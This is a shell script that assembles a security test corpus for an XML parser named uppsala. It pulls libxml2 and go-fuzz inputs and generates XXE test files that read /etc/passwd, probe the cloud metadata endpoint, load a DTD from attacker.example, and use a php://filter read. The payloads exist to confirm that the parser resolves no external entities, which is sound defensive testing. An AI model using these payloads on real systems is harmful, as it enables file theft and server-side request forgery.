#!/bin/sh
# fetch_corpus.sh — assemble the extended test corpus for uppsala.
#
# Populates test-data/corpus/ with:
#   security/   — entity-expansion DoS payloads (from libxml2 test/recurse),
#                 hand-generated XXE file-read/SSRF payloads, and namespace
#                 round-trip edge cases.
#   fuzz-seeds/ — parser/xpath/xsd seeds from libxml2 and (optionally)
#                 dvyukov/go-fuzz-corpus, plus fuzzer dictionaries.
#   realworld/  — one minimal-but-valid sample per XML dialect (§4 of
#                 other_xml.md), generated locally so the smoke tests are
#                 deterministic and license-clean.
#   encoding/   — reserved for optional vendored W3C i18n files (the
#                 encoding_matrix test also generates its matrix in-process).
#
# Everything is idempotent and re-run safe. Upstream corpora are pinned; the
# resolved commit is recorded in a SOURCE_COMMIT.txt next to the data.
#
# test-data/ is excluded from the published crate (see Cargo.toml `exclude`),
# so none of this ships to crates.io. Tests skip cleanly when the corpus is
# absent, so running this script is optional for a normal `cargo test`.
set -eu

ROOT=$(cd "$(dirname "$0")/.." && pwd)
CORPUS="$ROOT/test-data/corpus"

# libxml2: prefer an existing local checkout (../libxml2); fall back to a
# shallow clone. Pinned to a specific commit for reproducibility.
LIBXML2_DIR="${LIBXML2_DIR:-$ROOT/../libxml2}"
LIBXML2_PIN="${LIBXML2_PIN:-c8eaf2236ff16667970f96f3f01e119c99d38ab2}"
LIBXML2_REMOTE="https://gitlab.gnome.org/GNOME/libxml2.git"

# go-fuzz-corpus (optional; needs network). Rarely updated; we record whatever
# commit we actually fetched.
GOFUZZ_REMOTE="https://github.com/dvyukov/go-fuzz-corpus.git"

log() { printf '  %s\n' "$*"; }
section() { printf '\n== %s ==\n' "$*"; }

# extract_libxml2 <tree-path> <dest-dir> <strip-components>
# Uses `git archive` at the pin so the working-tree state doesn't matter.
extract_libxml2() {
    tree_path=$1
    dest=$2
    strip=$3
    mkdir -p "$dest"
    git -C "$LIBXML2_SRC" archive "$LIBXML2_PIN" "$tree_path" \
        | tar -x -C "$dest" --strip-components="$strip"
}

section "libxml2 (pin $LIBXML2_PIN)"
LIBXML2_SRC=""
if [ -d "$LIBXML2_DIR/.git" ] && git -C "$LIBXML2_DIR" cat-file -e "$LIBXML2_PIN^{commit}" 2>/dev/null; then
    LIBXML2_SRC="$LIBXML2_DIR"
    log "using local checkout: $LIBXML2_DIR"
else
    LIBXML2_SRC="$ROOT/target/corpus-src/libxml2"
    if [ ! -d "$LIBXML2_SRC/.git" ]; then
        log "local checkout missing pin; cloning $LIBXML2_REMOTE"
        mkdir -p "$(dirname "$LIBXML2_SRC")"
        git clone --filter=blob:none "$LIBXML2_REMOTE" "$LIBXML2_SRC"
    fi
    git -C "$LIBXML2_SRC" fetch --depth 1 origin "$LIBXML2_PIN" 2>/dev/null || true
fi

if [ -n "$LIBXML2_SRC" ] && git -C "$LIBXML2_SRC" cat-file -e "$LIBXML2_PIN^{commit}" 2>/dev/null; then
    # Security: the entity-expansion DoS corpus. The external-entity variants
    # ship their .ent/.dtd fragments alongside precisely so a "no file read"
    # assertion is meaningful.
    extract_libxml2 "test/recurse" "$CORPUS/security/recurse" 2
    # Fuzz seeds: broad parser/schema/xpath inputs + fuzzer dictionaries.
    extract_libxml2 "test/schemas" "$CORPUS/fuzz-seeds/libxml2/schemas" 2 2>/dev/null || true
    extract_libxml2 "test/XPath" "$CORPUS/fuzz-seeds/libxml2/xpath" 2 2>/dev/null || true
    extract_libxml2 "fuzz" "$CORPUS/fuzz-seeds/libxml2/dict" 1 2>/dev/null || true
    # License + provenance.
    git -C "$LIBXML2_SRC" show "$LIBXML2_PIN:Copyright" > "$CORPUS/security/recurse/LICENSE" 2>/dev/null || true
    cp -f "$CORPUS/security/recurse/LICENSE" "$CORPUS/fuzz-seeds/libxml2/LICENSE" 2>/dev/null || true
    printf 'libxml2\n%s\n%s\n' "$LIBXML2_REMOTE" "$LIBXML2_PIN" > "$CORPUS/security/recurse/SOURCE_COMMIT.txt"
    cp -f "$CORPUS/security/recurse/SOURCE_COMMIT.txt" "$CORPUS/fuzz-seeds/libxml2/SOURCE_COMMIT.txt"
    log "extracted test/recurse, test/schemas, test/XPath, fuzz dicts"
else
    log "SKIP: libxml2 pin unavailable (no local checkout, no network)"
fi

section "go-fuzz-corpus (optional, needs network)"
GOFUZZ_SRC="$ROOT/target/corpus-src/go-fuzz-corpus"
if [ ! -d "$GOFUZZ_SRC/.git" ]; then
    git clone --depth 1 "$GOFUZZ_REMOTE" "$GOFUZZ_SRC" 2>/dev/null || true
fi
if [ -d "$GOFUZZ_SRC/xml/corpus" ]; then
    mkdir -p "$CORPUS/fuzz-seeds/go-fuzz-corpus"
    # Seeds live under xml/corpus/; skip the Go harness source (xml.go).
    cp -f "$GOFUZZ_SRC"/xml/corpus/* "$CORPUS/fuzz-seeds/go-fuzz-corpus/" 2>/dev/null || true
    gf_commit=$(git -C "$GOFUZZ_SRC" rev-parse HEAD 2>/dev/null || echo unknown)
    printf 'go-fuzz-corpus\n%s\n%s\n' "$GOFUZZ_REMOTE" "$gf_commit" \
        > "$CORPUS/fuzz-seeds/go-fuzz-corpus/SOURCE_COMMIT.txt"
    log "copied go-fuzz-corpus/xml seeds ($gf_commit)"
else
    log "SKIP: go-fuzz-corpus not fetched (offline is fine)"
fi

# ─── Generated payloads (offline, license-clean, deterministic) ────────────

section "security/xxe (generated)"
XXE="$CORPUS/security/xxe"
mkdir -p "$XXE"
# Classic XXE file read. uppsala never resolves external entities, so parsing
# must NOT read /etc/passwd; the entity is left unexpanded or the doc rejected.
cat > "$XXE/classic_file_read.xml" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF
# SSRF via external entity to a cloud metadata endpoint. Must not open a socket.
cat > "$XXE/ssrf_metadata.xml" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
EOF
# Parameter-entity + external DTD (OOB exfil shape). Must not fetch the DTD.
cat > "$XXE/param_external_dtd.xml" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd">
  %ext;
]>
<root>ok</root>
EOF
# PHP wrapper base64 read. Must not resolve the wrapper.
cat > "$XXE/php_wrapper.xml" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
EOF
cat > "$XXE/README.md" <<'EOF'
# Generated XXE payloads

Hand-written, well-known XXE/SSRF shapes. Static inputs only — never run
through a resolving parser and never contact the domains/paths they name.
uppsala never resolves external entities, so the invariant under test is:
parsing performs no file read and no socket open, and the external entity is
left unexpanded (or the document is rejected). No upstream license applies.
EOF

section "security/roundtrip (generated)"
RT="$CORPUS/security/roundtrip"
mkdir -p "$RT"
# Namespace / directive edge cases that naively-written serializers mutate
# across parse->serialize->reparse (the SAML-signature-bypass class,
# CVE-2020-2950x family). The invariant: parse(serialize(parse(x))) is
# token-identical to parse(x).
cat > "$RT/ns_prefix_redecl.xml" <<'EOF'
<a:root xmlns:a="urn:one" xmlns:b="urn:two">
  <a:child b:attr="v">text</a:child>
  <b:child a:attr="w"/>
</a:root>
EOF
cat > "$RT/default_ns_scope.xml" <<'EOF'
<root xmlns="urn:default">
  <child xmlns="">bare</child>
  <child>defaulted</child>
</root>
EOF
cat > "$RT/comment_pi_cdata.xml" <<'EOF'
<root>
  <!-- a plain comment that must survive a round trip -->
  <?target pi data without a terminator?>
  <![CDATA[ raw < & > brackets ]] not closed early ]]>
  <e attr="&lt;&amp;&gt;">a &amp; b &lt; c</e>
</root>
EOF
cat > "$RT/README.md" <<'EOF'
# Generated round-trip edge cases

Namespace-scoping and mixed-content inputs known to trip naive serializers.
Invariant: parse(serialize(parse(x))) is token-identical to parse(x); prefixes
and expanded names do not drift. No upstream license applies.
EOF

section "realworld (generated, one file per dialect)"
sh "$ROOT/scripts/gen_realworld.sh" "$CORPUS/realworld"

section "top-level README"
cat > "$CORPUS/README.md" <<'EOF'
# test-data/corpus — extended test corpus

Assembled by `scripts/fetch_corpus.sh`. Excluded from the published crate
(`test-data/` is in Cargo.toml `exclude`). Tests skip cleanly when absent.

| Dir | Source | License | Used by |
|-----|--------|---------|---------|
| `security/recurse/` | libxml2 `test/recurse` (pinned) | MIT/Expat (see LICENSE) | `tests/security_corpus.rs` |
| `security/xxe/` | generated (this script) | none (public payloads) | `tests/security_corpus.rs` |
| `security/roundtrip/` | generated (this script) | none | `tests/security_corpus.rs` |
| `fuzz-seeds/libxml2/` | libxml2 `test/schemas`,`test/XPath`,`fuzz` (pinned) | MIT/Expat | `audit/fuzz` (via `just fuzz-seed-import`) |
| `fuzz-seeds/go-fuzz-corpus/` | dvyukov/go-fuzz-corpus (optional) | MIT | `audit/fuzz` |
| `realworld/` | generated minimal samples | none | `tests/realworld_corpus.rs` |
| `encoding/` | optional W3C i18n files | W3C Test Suite License | `tests/encoding_matrix.rs` |

Provenance (remote + resolved commit) is recorded in each `SOURCE_COMMIT.txt`.
EOF

printf '\nDone. Corpus assembled under %s\n' "$CORPUS"
